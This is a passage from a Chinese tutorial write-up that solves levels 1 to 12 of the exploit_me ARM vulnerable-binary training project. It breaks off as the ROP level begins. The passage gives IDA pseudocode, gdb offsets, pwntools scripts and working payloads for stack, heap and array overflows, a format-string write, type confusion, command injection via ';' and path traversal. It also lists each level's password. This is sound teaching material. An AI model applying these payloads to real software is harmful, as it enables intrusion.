# 一文读懂ARM架构下的漏洞利用
> KDEV
> 来源：https://www.iotsec-zone.com/article/484

# 0x00 简介
[https://github.com/bkerler/exploit_me](https://github.com/bkerler/exploit_me) 是github上一个学习ARM架构下二进制漏洞的项目。目前包括14个不同类型的漏洞
Level 1: Integer overflow
Level 2: Stack overflow
Level 3: Array overflow
Level 4: Off by one
Level 5: Stack cookie
Level 6: Format string
Level 7: Heap overflow
Level 8: Structure redirection / Type confusion
Level 9: Zero pointers
Level 10: Command injection
Level 11: Path Traversal
Level 12: Basic ROP
Level 13: Use-after-free
Level 14: Jump Oriented Programming
# 0x01 level 1 Integer overflow
直接运行./exploit
得到输出结果和第一关的密码
```bash
usage: ./exploit <level_password> <arg1> <arg2>
Level 1 Password="hello"
```
这个题目的用法就是./exploit 每一关的密码 第一个参数 第二个参数
执行./exploit hello
```bash
usage: ./exploit hello <value>
```
得到第一关的用法
先随便输几个值
./exploit hello 1
Value 1 defined.
./exploit hello -1
Value 65535 defined.
因为题目是整型溢出，所以我们这里输入一个超大的数字试试
./exploit hello 99999999999999
Value 65535 defined.
可以看到并没有溢出，输入负数试试
./exploit hello -99999999999999
Level 2 Password: "help"
直接输出了第二关的密码"help"
为了搞清楚原理，进IDA查看该函数
```c
int __fastcall int_overflow(int a1)
{
  int v2; // [sp+14h] [bp+14h]

  v2 = atoi(a1);
  if ( !v2 )
  {
    puts("Value less or equal 0 is not allowed.");
    exit(0);
  }
  if ( (_WORD)v2 )
  {
    printf("Value %d defined.\n", (unsigned __int16)v2);
    exit(0);
  }
  printf("Level 2 Password: \"%s\"\n", "help");
  return 0;
}
```
这里分析伪代码，可以发现我们输入的参数先是用atoi函数做了一次整型变换强制转换为int类型，然后进行两个判断，当v2=0或者v2的低16位地址不为0的时候都会进行输出，然后exit(0)
而我们要执行的目标函数在if外面，如果前面两个if结果有一个成立，打印密码那一条代码都不会被执行
所以我们输入了一个超过int大小的整数，超过了atoi()函数的处理能力，使v2不满足那两个条件，从而执行printf打印第二关的密码。

# 0x02 level 2 Stack overflow
查看hints.txt描述，这是一个典型的栈溢出题目。
```bash
./exploit help
usage: ./exploit help <username> <password>
```
提示输入用户名和密码。直接查看IDA里面这段内容
```c
int __fastcall stack_overflow(int a1, int a2)
{
  char v5[8]; // [sp+8h] [bp+8h] BYREF
  char v6[8]; // [sp+10h] [bp+10h] BYREF
  __int16 v7; // [sp+18h] [bp+18h] BYREF
  int v8; // [sp+1Ah] [bp+1Ah]
  __int16 v9; // [sp+1Eh] [bp+1Eh]
  __int64 savedregs; // [sp+20h] [bp+20h] BYREF

  v7 = 0;
  v8 = 0;
  v9 = 0;
  strcpy(v6, "admin");
  strcpy(v5, "funny");
  strcpy(&v7, a1);
  *((_BYTE *)&savedregs + strlen(v6) - 8) = 0;
  if ( !strcmp(&v7, v6) )
  {
    strcpy(&v7, a2);
    *((_BYTE *)&savedregs + strlen(v5) - 8) = 0;
    if ( !strcmp(&v7, v5) )
    {
      puts("Login succeeded, but still you failed :P");
      return 1;
    }
    else
    {
      puts("Login failed");
      return 0;
    }
  }
  else
  {
    puts("Login failed");
    return 0;
  }
}
```
一共用了4个strcpy()函数，前2个我们都没法利用，写死在里面，我们要做的就是利用第四个strcpy()溢出v7所在的位置的缓冲区，通过构建一个足够长的password来溢出它。
观察这段代码也可以看到用户名和密码是admin和funny
要执行到第四个strcpy()我们需要确保用户名是正确的才行
首先输入一个溢出长度的password,这里用cyclic生成，用来计算溢出偏移量
qemu-arm -g 1234 ./exploit help admin aaaabaaacaaadaaaeaaafaaagaaa
进gdb调试直接按C运行
![0.png](https://www.iotsec-zone.com/api/image/v2/20241227/d6mdlqoyia8gzc1lhn.png)
运行到最后发现程序跳转到了0x61616164这个地址
把这个地址输入cyclic
cyclic -l 0x61616164
12
得到偏移量为12。由此可以开始构造我们的payload
```py
from pwn import *
addr = 0x113e0    #level3password()函数的地址
payload = b'a'*(12)+p32(addr)
cmd = ['qemu-arm','./exploit','help','admin',payload]
p= process(cmd)
p.interactive()
```
hints.txt里面提示我们run level3password()
在IDA里面找到该函数，获取它的地址写进exp里面

![1.png](https://www.iotsec-zone.com/api/image/v2/20241227/d6mdm20w5whgv82rwx.png)
执行exp即可看到第三关的密码Velvet
```bash
python3 exp.py 
[+] Starting local process '/usr/bin/qemu-arm': pid 27580
[*] Switching to interactive mode
Login failed
Level 3 Password: "Velvet"
[*] Got EOF while reading in interactive
$  
```
# 0x03 level 3 Array Overflow
查看第三关的描述：
```
LEVEL 3 - Array Overflow
-------
   ./exploit xxx [arraynumber] [content]

   Hint: You have a maximum of 32 slots to store content.
   Try to run the function level4password
```
翻译过来就是数组溢出，就是在访问数组的时候，访问超出数组大小的下标的内容会导致程序访问到数组内存之外的内存地址，这里数组的上限是32。
输入第三关的密码
 ./exploit Velvet
usage: ./exploit Velvet <arraypos> <value>
发现第三关需要我们输入两个值
用IDA分析第三关的伪代码：
```c
  if ( !strcmp(argv[1], aVelvet) )
  {
    if ( argc <= 3 )
    {
      printf("usage: %s %s <arraypos> <value>\n", *argv, aVelvet);
      ((void (__fastcall __noreturn *)(_DWORD))exit)(0);
    }
    v9 = geteuid();
    v10 = geteuid();
    v11 = geteuid();
    setresuid(v9, v10, v11);
    v12 = atoi(argv[2]);
    v13 = atoi(argv[3]);
    array_overflow(v12, v13);
    ((void (__fastcall __noreturn *)(_DWORD))exit)(0);
  }
```

可以发现这里用了两个atoi()将输入转换为整型，所以我们这一关只能输入十进制数字，输入其他的值都会变成0。
查看array_overflow(v12,v13)函数
```c
int __fastcall array_overflow(int a1, int a2)
{
  int savedregs; // [sp+8Ch] [bp+0h] BYREF

  *(&savedregs + a1 - 33) = a2;
  return printf("filling array position %d with %d\n", a1, a2);
}
```
这里伪代码有点没看懂，应该是IDA的问题，问了下AI，这个函数定义了一个savedregs的数组指针，其中的a1是程序的下标，程序将a2写入这个数组的a1的位置
转换成C代码大概是这样：
```c
    int savedregs[32];
    savedregs[a1]=a2;
```
我们把第一个参数换成33 ，第二个参数随便填一个数字，然后发现它的缓冲区被溢出了
```bash
./exploit Velvet 33 124
filling array position 33 with 124
qemu: uncaught target signal 11 (Segmentation fault) - core dumped
段错误 (核心已转储)
```
用gdb调试看一下程序运行结果
```bash
qemu-arm -g 1234 ./exploit Velvet 33 124
```
![2.png](https://www.iotsec-zone.com/api/image/v2/20241227/d6mdmg5wkmhbeh3ulc.png)
发现程序最终停在0x7c这里，转换成十进制刚好等于124，也就是我们输入的第二个参数
所以我们只要让第一个参数设置为33，第二个参数设置为我们要跳转到的函数的内存地址的十进制格式，就可以执行程序里的任意函数了。
在IDA里面查看level4password()函数的地址为0x00011550
转换成十进制是70992
```bash
./exploit Velvet 33 70992
filling array position 33 with 70992
Level 4 Password: "mysecret"
```
得到第四关的密码"mysecret"

# 0x04 level 4 Off by One
```
LEVEL 4 - Off by One
-------
   ./exploit xxx [magic]
   
   Hint: Magic happens if there are enough null bytes
```
根据提示，第四关参数只有一个
用IDA查看该函数的伪代码
```c
int __fastcall off_by_one(char *a1)
{
  char v3[256]; // [sp+Ch] [bp-108h] BYREF
  char v4; // [sp+10Ch] [bp-8h]

  v4 = 1;
  if ( (unsigned int)strlen(a1) > 0x100 )
  {
    puts("Length higher 256 not allowed !");
    ((void (__fastcall __noreturn *)(int))exit)(1);
  }
  strcpy(v3, a1);
  if ( !v4 )
    level5password();
  return 0;
}
```
这里定义了两个char变量，存在一个长度判断，如果a1的长度超过256，则退出，并且只有当v4为零时，才会输出第五关的密码。然而v4在开头就被赋值为1，如果输入正常的值不可能获取到第五关的密码
这里存在一个strcpy函数，很明显我们要溢出这个函数
既然要我们给它一个值，不如直接给他一个256长度的字符串
用cyclic 256生成一个256长度的字符串
```bash
cyclic 256
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaac
```
然后把这个字符串的最后一位改成0
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaa0
尝试用这个字符串作为第四关的输入
```bash
./exploit mysecret aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaa0
Level 5 Password: "freedom"
```
结果是成功输出了第五关的密码"freedom"  
这道题的原理是利用了源码中数组的长度特性。虽然数组的定义长度为 256，但由于 C 语言中字符串必须以 \0 结尾，如果没有 \0 结尾，字符串操作可能会越界并引发溢出。因此，输入恰好 256 字节的字符串会导致栈溢出，覆盖掉 v4 的内容，同时也确保了 a1 的长度不超过 256。
# 0x05 level 5 Stack Cookie
```
LEVEL 5 - Stack Cookie
-------
   ./exploit xxx [magic]
   
   Hint: There might be a stack cookie preventing you to have success
```
进IDA分析漏洞点代码
```c
int __fastcall stack_cookie(int a1)
{
  int v2[16]; // [sp+8h] [bp-4Ch] BYREF
  char v3; // [sp+48h] [bp-Ch]
  int v4; // [sp+4Ch] [bp-8h]

  v4 = secret;
  v3 = 0;
  memset(v2, 0, sizeof(v2));
  strcpy(v2, a1);
  if ( v4 != secret )
  {
    printf("Error: Stack corrupted !");
    ((void (__fastcall __noreturn *)(int))exit)(1);
  }
  puts("Running normally");
  if ( v3 == 1 )
    printf("Level 6 Password: \"%s\"\n", aHappyness);
  return 1;
}
```
分析得知该函数定义了3个变量v2,v3,v4其中把v4赋值secret ,这里secret值我们在IDA看不到，只能动态调试获取
然后进行了strcpy操作v2数组，在复制之后检测v4是否被篡改，如果被篡改程序就结束，这是一个canary保护，可以有效的检测是否栈溢出，最后检测v3的值是否为1，如果为1输出level 6 的password。
我们要做的就是溢出掉这里的strcpy，同时写进去的值要保证v4的值仍然为secret
```
int v2[16]; // [sp+8h] [bp-4Ch] BYREF
  char v3; // [sp+48h] [bp-Ch]
  int v4; // [sp+4Ch] [bp-8h]
```
观察IDA里面这段代码，我们可以看到这三个变量在栈空间的分布顺序
v2位于sp + 0x8的位置
v3 位于sp + 0x48的位置
v4位于sp + 0x4C的位置
接下来就是获取canary的值和canary的位置
![3.png](https://www.iotsec-zone.com/api/image/v2/20241227/d6mdny3q3v7nflart4.png)
根据这个位置判断，我们只需要修改a1的值，让它溢出掉v2的缓冲区，用0x00000001覆盖掉v3,同时要保证不覆盖到v4即可让程序输出密码
准备构造一个payload =b'A'*(64)+p32(v3)
在写EXP的时候遇到了这个问题
```
pwnlib.exception.PwnlibException: Inappropriate nulls in argv[3]: b'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa7\x13\x00\x00\x01\x00\x00\x00'
```
pwntools库不让我对第三个函数的输入参数添加包含\x00的字符串，只能另辟蹊径
在执行命令的时候用美元符号添加python的输出
```bash
./exploit freedom $(python3 -c "print('A'*64+'\x01\x00\x00\x00')")
```
用gdb查看栈内存的数据发现满足条件
![4.png](https://www.iotsec-zone.com/api/image/v2/20241227/d6mdo6mw7did8da8tl.png)
```bash
 ./exploit freedom $(python3 -c "print('A'*64+'\x01\x00\x00\x00')")
bash: 警告： 命令替换：忽略输入中的 null 字节
Running normally
Level 6 Password: "happyness"
```
程序执行成功，并且输出了第六关的密码"happyness"
# 0x06 level 6 Format String
```
LEVEL 6 - Format String
-------
   ./exploit xxx
   
   Hint: r should return Y instead of N. But sometimes codes don't want you to reach a simple 'Y'.  
         But maybe a print function is buggy ?
```
输入第六关密码之后，程序会提示我们输入密码
```bash
./exploit happyness
Enter your password:
Password=

r=N
No Level Password for you today.
```
这里输入任意值，都会显示相同的结果，要找到答案还是得去IDA里面查看漏洞函数
```c
int format_string()
{
  unsigned __int8 v1; // [sp+Fh] [bp-5h]

  printf("Enter your password:");
  v1 = goodPassword();
  printf("r=%c\n", v1);
  if ( v1 != 89 )
  {
    puts("No Level Password for you today.");
    ((void (__fastcall __noreturn *)(int))exit)(-1);
  }
  printf("Level 7 Password: \"%s\"\n", aMypony);
  return 0;
}
int goodPassword(void)
{
  int v1; // [sp+0h] [bp-Ch] BYREF
  int *v2; // [sp+4h] [bp-8h]

  v1 = 78;
  v2 = &v1;
  fgets(Password, 100, stdin);
  printf("Password=");
  printf(Password);
  putchar(10);
  return (unsigned __int8)*v2;
}
```
查看伪代码，发现这里调用了goodPassword()函数获取密码的值v1，然后判断v1是否等于89，如果等于89就会打印第七关的密码。
但是查看goodPassword()函数，发现这里返回的v2是v1的值，而v1被写死在程序中，虽然用fgets方法将输入赋给Password数组，但是并没有对v1进行任何操作。
根据题目提示，这里存在一个格式化字符串漏洞，因为这里调用了printf()打印Password字符串，但是并不是用%s的格式传递参数，而是直接打印printf(Password);这就会导致一个问题，让我们可以使用%s,%d,%p之类的格式化字符串来打印栈空间的任意内容。
这里列出所有格式化字符串的用法
```
%d	以十进制形式输出整数
%u	以十进制形式输出无符号整数
%x	以十六进制形式输出整数（小写字母）
%X	以十六进制形式输出整数（大写字母）
%o	以十进制形式输出整数
%f	以浮点数形式输出实数
%e	以指数形式输出实数
%g	自动选择%f或者%e输出实数
%c	输出单个字符
%s	输出字符串
%p	输出指针的地址
%n	将已经输出的字符数写入参数
```
如果我们在Password里面输入%d %d ,虽然printf(Password)这里没有任何参数，但是程序仍然会输出栈空间的内容，现在我们回到程序，在password里面连续输入%x %x %x %x %x %x %x %x，看看输出结果
```
./exploit happyness
Enter your password:%x %x %x %x %x %x %x %x
Password=407ffeec 0 0 4e 407fff30 407fff54 11378 408001d4

r=N
No Level Password for you today.
```
结合GDB调试查看栈空间的内存
```
0x407fff30:	0x0000004e	0x407fff30	0x407fff54	0x00011378
0x407fff40:	0x408001d4	0x00000000	0x00000000	0xb9c41600
0x407fff50:	0x40800074	0x00011bf0	0x408001d4	0x00000002
0x407fff60:	0x00000000	0x00000000	0x00000000	0x00000000
0x407fff70:	0x00000000	0x00000000	0x00000000	0x00000000
0x407fff80:	0x00000000	0x00000000	0x00000000	0x00000000
0x407fff90:	0x00000000	0x00000000	0x00000000	0x00000000
0x407fffa0:	0x00000000	0x00000000	0x00000000	0x00000000
0x407fffb0:	0x00000000	0x00000000	0x00000000	0x00000000
0x407fffc0:	0x00000000	0x00000000	0x00000000	0x408001d4
0x407fffd0:	0x00000000	0x00000000	0x00000000	0x00000000
0x407fffe0:	0x00000000	0x00000000	0x00000000	0x00000000
0x407ffff0:	0x00000000	0x00000000
```
我们发现0x0000004e，0x407fff30分别对应着伪代码里面v1,v2的值，其中v2是一个指向v1的指针
还记得我们前面写的那个程序吗？在那个格式化字符串中，我们没有用到数字+$，在这时候，程序遇到一个占位符，就按顺序向后寻找参数，但是我们可以使用数字+$的形式，直接指定参数相对于格式化字符串的偏移，我们来看看这个程序：
```c
int main() {

	char a[] = "aaaa";
	char b[] = "bbbb";
	char c[] = "cccc";
	char d[] = "dddd";
	printf("%3$s  %2$s  %1$s", a, b, c);

	return 0;
} 
```
这样，当程序看到%3$s的时候，就不是直接找相对于格式化字符串的第一个参数了，而是去找相对于格式化字符串的第三个参数，这样的话，就会输出cccc，而整个程序输出
```
cccc bbbb aaaa
```
所以这里输入%4$d就可以直接打印出来v1的值4e，也就是78，输入%5$x就能打印出来v2指向的地址0x407fff30。这就是格式化字符串的信息泄露漏洞。
但是对于这道题，只是信息泄露还不够，我们要修改v1的值为89来满足程序的判断逻辑。
这里就要用到%n这个方法了。它的作用是将printf()打印出来的字符数输入进对应的地址中
我们还会用到%数字c，它将打印[数字]个空格来填充printf，两个方法结合起来用
我们这里只需要输入%89c%5$n就可以实现对内存上v2指向的地址修改为89
所以这道题的密码也就是%89c%5$n
```bash
./exploit happyness 
Enter your password:%89c%5$n
Password=                                                                                        �

r=Y
Level 7 Password: "mypony"
```
执行成功，获得第七关的密码"mypony"

# 0x07 level 7 Heap Overflow
```
LEVEL 7 - Heap Overflow
-------
   [32-Bit] 
   ./exploit xxx [text]

   Hint: Success will be for those to change the magic to 0x6763
```
提示是堆溢出，成功的标志是将magic number 修改为0x6763
IDA伪代码分析：
```c
int __fastcall heap_overflow(int a1)
{
  _DWORD *v3; // [sp+8h] [bp-Ch]
  int v4; // [sp+Ch] [bp-8h]

  v4 = operator new(0x20u);
  v3 = (_DWORD *)operator new(4u);
  *v3 = 0;
  strcpy(v4, a1);
  printf("Heap magic number: 0x%x\n", *v3);
  if ( *v3 == 26467 )
    printf("Level 8 Password: \"%s\"\n", aExploiter);
  return 0;
}
```
这里一共定义了两个变量v3和v4，其中v3是指针，指向operator new(4u)开辟的堆空间
用strcpy将main运行的参数复制给v4，这里就存在溢出漏洞
最后判断v3是否==26467也就是判断是否被我们溢出掉
这关卡设计的非常方便，因为他每次运行都会打印出v3的值，不用我们去gdb里面一个一个找
cyclic 50 生成一个50 长度的字符串
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaama
然后把这个字符串作为参数运行
```bash
./exploit mypony aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaama
Heap magic number: 0x6161616b
```
这里观察到程序已经溢出，把这个0x6161616b给cyclic -l 
cyclic -l 0x6161616b
40
算出偏移量为40,前面填充40个字符串，然后输入0x6763的p32字节流
```bash
qemu-arm  ./exploit mypony $(python3 -c 'print ("A"*40 + "\x63\x67")')
Heap magic number: 0x6763
Level 8 Password: "Exploiter"
```
第七关堆溢出成功，得到第八关密码"Exploiter"
# 0x08 level 8 Type Confusion
```
LEVEL 8 - Type Confusion
------- 
   ./exploit xxx [cmd]
   
   Hint: How can we set the pointer of g to be the pointer of b, in order to get a pointer that is executed ?
```
提示：我们如何将 g 的指针设置为 b 的指针，以便获得一个可执行的指针？
进入IDA查看漏洞点函数
```c
int __fastcall type_confusion(int a1)
{
  Msg *v1;   // v1 是 Msg 类的指针
  Run *v2;   // v2 是 Run 类的指针
  int v5[16]; // 临时存储数组 v5，用于存储一些数据
  void *v6[2]; // v6 用于存储指针，大小为 2
  Run *v7;   // v7 用于存储 Run 类型的指针
  void *v8;  // v8 用于存储指针

  v1 = (Msg *)operator new(4u); // 为 Msg 类型分配 4 字节的内存
  *(_DWORD *)v1 = 0;            // 初始化为 0
  Msg::Msg(v1);                 // 调用 Msg 类的构造函数
  v6[0] = v1;                   // 将 v1 存储到 v6 数组的第一个位置

  v2 = (Run *)operator new(4u); // 为 Run 类型分配 4 字节的内存
  *(_DWORD *)v2 = 0;            // 初始化为 0
  Run::Run(v2);                 // 调用 Run 类的构造函数
  v8 = v2;                      // 将 v2 存储到 v8
  v7 = v2;                      // 将 v2 存储到 v7
  printf("Current g ptr, addr: %p\n", v2); // 输出 v2 地址
  printf("Current b ptr, addr: %p,%lx\n", v6[0], v6); // 输出 v6[0] 地址及 v6 地址
  
  memset(v5, 0, sizeof(v5)); // 清空 v5 数组
  v6[1] = 0;                 // 将 v6[1] 设置为 0
  strcpy(v5, a1);            // 将 a1 的内容复制到 v5

  // 调用 v7 指向的 Run 类型对象的成员函数，参数为 v5
  (**(void (__fastcall ***)(Run *, int *))v7)(v7, v5);

  if ( v8 ) 
    operator delete(v8);     // 删除 v8 指向的内存

  if ( v6[0] ) 
    operator delete(v6[0]);  // 删除 v6[0] 指向的内存

  return 0;
}
int __fastcall Run::run(Run *this, const char *a2)
{
  return system(a2);
}
int __fastcall Msg::msg(Msg *this, const char *a2)
{
  return printf("Level 9 Password: \"%s\", welcome %s\n", aGimme, a2);
}
```
直接运行./exploit Exploiter whoami
```bash
./exploit Exploiter whoami
Current g ptr, addr: 0xaef20
Current b ptr, addr: 0xaef10,fffeeca8
iot
```
程序会打印g(Run v2)指针，b(v6[0])指针和它在栈空间上的位置，然后执行系统指令whoami
回到伪代码这里，观察v6[0]的赋值过程，发现他指向一个名字为 Msg的类，这个类有一个方法Msg::msg，这个方法会打印出Lv9的密码。
而v2指向 Run类，这个类有一个Run::run方法，作用是执行系统命令system(a2)
观察这句代码
`(**(void (__fastcall ***)(Run *, int *))v7)(v7, v5);`
它的作用就是调用v7指针指向的Run类方法，也就是Run::run(v5)
这里的v7在前面指向了v2,是Run类的指针。hint里面提示要我们把v7从原来指向g(v2)的指针改变成指向b(v1)，看看会发生什么。根据IDA给出的栈相对位置，我列出了一个这样的表格用于展示栈偏移
![5.png](https://www.iotsec-zone.com/vx_images/145423635329325.png)
我们可以用一个精心编造的payload溢出掉这条语句`strcpy(v5, a1);`覆盖到v7修改掉v7的值， 需要修改的值在之前的运行里面已经给我们了
所以payload = b'a'*72+ p32(0xaef10)
由payload编写exp
```py
from pwn import *
b_point_addr = 0xaef10
payload = b'a'*(18*4) + p32(b_point_addr)
cmd = ['./exploit','Exploiter',payload]
p = process(cmd)
p.interactive()
```
直接执行获得结果
```bash
python3 level8.py 
[+] Starting local process './exploit': pid 16646
[*] Switching to interactive mode
Current g ptr, addr: 0xaef20
Current b ptr, addr: 0xaef10,fffeec58
Level 9 Password: "Gimme", welcome aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x10\xef
```
这里成功执行了Msg类型的msg方法打印Lv9的password Gimme
重新回来分析这条语句
`(**(void (__fastcall ***)(Run *, int *))v7)(v7, v5);`
查看一下汇编指令可以发现：
```
LDR     R3, [R11,#var_14]
LDR     R3, [R3]
LDR     R3, [R3]
SUB     R2, R11, #-var_5C
MOV     R1, R2
LDR     R0, [R11,#var_14]
BLX     R3
```
在汇编语句里面，不管这个指针是什么类型的，它在栈空间存储的方式并没有什么不同，存储的数据都是他们的类的地址，在汇编里面，程序加载栈空间上这个地址给R3，然后BLX R3跳转，所以这里只要覆盖掉这个位置的指针，就能实现跳转，程序不会管它到底是Msg类还是Run类

```
pwndbg> x/50xw $sp
0xfffeec10:	0x000a9d48	0xfffef0be	0x00000000	0x00000000
0xfffeec20:	0x00000000	0x00000000	0x00000000	0x00000000
0xfffeec30:	0x00000000	0x00000000	0x00000000	0x00000000
0xfffeec40:	0x00000000	0x00000000	0x00000000	0x00000000
0xfffeec50:	0x00000000	0x00000000	0x000aef10	0x00000000
0xfffeec60:	0x000aef20	0x000aef20	0x00000000	0x000003e8
   
pwndbg> x/50xw $sp
0xfffeec10:	0x000a9d48	0xfffef0be	0x61616161	0x61616161
0xfffeec20:	0x61616161	0x61616161	0x61616161	0x61616161
0xfffeec30:	0x61616161	0x61616161	0x61616161	0x61616161
0xfffeec40:	0x61616161	0x61616161	0x61616161	0x61616161
0xfffeec50:	0x61616161	0x61616161	0x61616161	0x61616161
0xfffeec60:	0x000aef10	0x000aef20	0x00000000	0x000003e8    
```

# 0x09 level 9 Zero Pointers
```
LEVEL 9 - Zero Pointers
-------
   ./exploit xxx [addr] [flag1] [flag2]
   
   Hint: Try some address with flag1=0 and flag2=0
```
提示让我们试一些地址，然后flag1 = 0 flag2 = 0
```bash
./exploit Gimme 0x00100 0 0
Address: 00000100, Important ptr: 407FFF14, Important value: 2
```
有点不明所以，还是先看下IDA里面的伪代码：
```c
int __fastcall nullify(_DWORD *a1, int a2)
{
  int v3; // [sp+Ch] [bp-10h] BYREF
  _DWORD *v4; // [sp+10h] [bp-Ch]
  int *v5; // [sp+14h] [bp-8h]

  v5 = &v3;
  v3 = 2;
  v4 = a1;
  if ( a2 == 1 )
    *v4 = 0;
  printf("Address: %08lX, Important ptr: %08lX, Important value: %d\n", a1, &v3, v3);
  if ( !v3 )
    printf("Level 10 Password: \"%s\"\n", aFun);
  return 0;
}
```
这里a1是我们输入的地址，a2是我们输入的flag
程序先是定义了2个指针，*v4,*v5，然后把v3的地址给v5，将v3置2，然后将地址传给指针v4，然后进行判断输入的flag ==1，如果等于1，就把v4对应位置的值设置为0。
然后printf打印出v3的地址和值。在下面又做了一次判断v3是否等于0，如果等于0输出第十关的密码
所以这关还是很简单，第一次随便输入一个地址，flag设置为0,就能获取v3地址，第二次把v3的地址和flag = 1 填进去就能拿到密码了
```bash
./exploit Gimme 0x407FFF14 1
Address: 407FFF14, Important ptr: 407FFF14, Important value: 0
Level 10 Password: "Fun"
```
成功拿到第十关的密码"Fun"
# 0x10 level 10 Command Injection
```
LEVEL 10 - Command Injection
--------
   ./exploit xxx [Cmd]
   
   Hint: This will run "man Cmd". How can we run our own command, maybe a ; is helpful ?
```
输入第十关的密码得到用法
usage: ./exploit Fun <program>
提示文件告诉我们这个程序会运行 man cmd，man是linux下使用手册的程序，”man man“会输出man这个程序的用法
查看IDA
```c
int __fastcall cmd_inject(int a1, int a2)
{
  int v2; // r0
  int v3; // r0
  int v4; // r4
  int v5; // r5
  int v6; // r0
  char *v9; // [sp+Ch] [bp-10h]

  v2 = strlen(*(_DWORD *)(a2 + 8));
  v9 = (char *)((int (__fastcall *)(int))malloc)(v2 + 4);
  strcpy(v9, "man ");
  v3 = strcat(v9, *(_DWORD *)(a2 + 8));
  v4 = geteuid(v3);
  v5 = geteuid(v4);
  v6 = geteuid(v5);
  setresuid(v4, v5, v6);
  system(v9);
  if ( strchr(v9, 59) )
    printf("\nLevel 11 Password: \"%s\"\n", aViolet);
  free(v9);
  return 0;
}
```
这里就是一个标准的命令注入漏洞格式，使用strcpy将用户输入给man程序的参数拼接在一起，然后调用system()直接执行，对于这种情况，我们只需要在用户输入这里输入一个“;”就可以将前面的命令截断，在后面输入新的命令同样会被执行，比如echo,reboot之类的指令，从而拿到程序的RCE
这里用一个strchr判断命令里面是否存在";"，如果有就输出第十一关的密码
这里我们就输入
./exploit Fun man 1;echo 1234
1234
用echo 1234 来验证";"后面的命令是否被执行。
得到第十一关的密码“Violet"

# 0x11 level 11 Path Traversal
```
LEVEL 11 - Path Traversal
--------
   ./exploit xxx [Directory]
   
   Hint: Only ./dir1/dir2/ may be accepted, but maybe there is a trick to access a lower directory ?
```
输入lv 11的密码Violet，得到usage
```bash
usage: ./exploit Violet <path>

./exploit Violet ../
Only directory ./dir1/dir2/ and subdirectories may be listed!
```
看输出结果，我们只能输入./dir1/dir2
观察IDA的伪代码，发现通关的方法已经写在判断里面了。
```c
int __fastcall path_traversal(int a1)
{
  int v1; // r0
  int v2; // r0
  int v3; // r4
  int v4; // r5
  int v5; // r0
  char *v8; // [sp+Ch] [bp-10h]

  v1 = strlen(a1);
  v8 = (char *)((int (__fastcall *)(int))malloc)(v1 + 3);
  strcpy(v8, "ls ");
  v2 = strcat(v8, a1);
  v3 = geteuid(v2);
  v4 = geteuid(v3);
  v5 = geteuid(v4);
  setresuid(v3, v4, v5);
  if ( strncmp(a1, "dir1/dir2", 9) && strncmp(a1, "./dir1/dir2", 11) )
  {
    puts("Only directory ./dir1/dir2/ and subdirectories may be listed!");
    ((void (__fastcall __noreturn *)(_DWORD))exit)(0);
  }
  system(v8);
  if ( !strncmp(a1, "dir1/dir2/../..", 15) || !strncmp(a1, "./dir1/dir2/../..", 17) )
    printf("\nLevel 12 Password: \"%s\"\n", aRopeme);
  free(v8);
  return 0;
}
```
程序会执行ls +用户输入的目录，调用system，然后判断用户是否输入了./dir1/dir2/../..
然后打印12关的密码
```
./exploit Violet ./dir1/dir2/../..
arm  arm64  dir1  exploit  exploit64  level2.py  level3.py  level6.py  level7.py  text

Level 12 Password: "ropeme"
```
这道题给我们一个思路，可以用这种方式遍历目录，只要输入足够多的./../../这样的方式就能遍历到根目录。得到第十二关的密码“ropeme"
# 0x12 level 12 Return Oriented Programming (ROP)
```
LEVEL 12 - Return Oriented Programming (ROP)
--------
   ./exploit xxx
   
   Hint: How can we change the flag 1234 to 5678 using some string ?
   The compare at 0x01145c (32bit) / 0x0x400784 (64bit) needs some love
```
这道题摆明了告诉我们，要通过构建ROP链的方法修改flag为5678,从而pass那个if判断，从而打印lv 13的密码
先run一下得到lv 12的usage
```
./exploit ropeme
Please enter your magic stuff:
1
Flag: 00001234, You entered: 1

Bad password given.
```
直接提示让我们输入一个字符串，然后输出flag的值和Bad password
看下IDA的代码
```c
    setresuid(v40, v41, v42);
    puts("Please enter your magic stuff:");
    *(_DWORD *)v51 = 0;
    memset(s, 0, sizeof(s));
    _isoc99_scanf("%s", v51);
    rop(v51);
    exit(0);
```
这里用了一个scanf获取我们的输入，然后把输入作为参数传递给rop()，
然后是rop()的代码：
```c
int __fastcall rop(char *a1)
{
  printme(a1, 4660);
  if ( (unsigned __int8)comp(4660) != 1 )
    puts("\nBad password given.");
  return 0;
}
```
这里用了printme打印Flag和我们输入的值，然后调用comp()进行计算，而comp里面是这样的
```c
int __fastcall comp(int a1)
{
  if ( a1 == 22136 )
  {
    printf("\nLevel 12 Password: \"%s\"\n", aMagic);
    exit(0);
  }
  return 0;
}
```
这里有个判断，如果传入的值是22136(0x5678),就会打印第十三关的密码，但是回到rop()查看comp()的输入值，发现被固定为4660（0x1234)，这就导致不管程序怎样正常执行，都不会改变输出结果
那我们下一步的目标就是改掉comp()的输入值，通过构建ROP链的方式
第一步，先溢出掉scanf()函数，即输入一个超长字符串(用cyclic生成)，然后用gdb动态调试查看程序因为溢出跳转的地址
```bash
qemu-arm -g 1234 ./exploit ropeme 
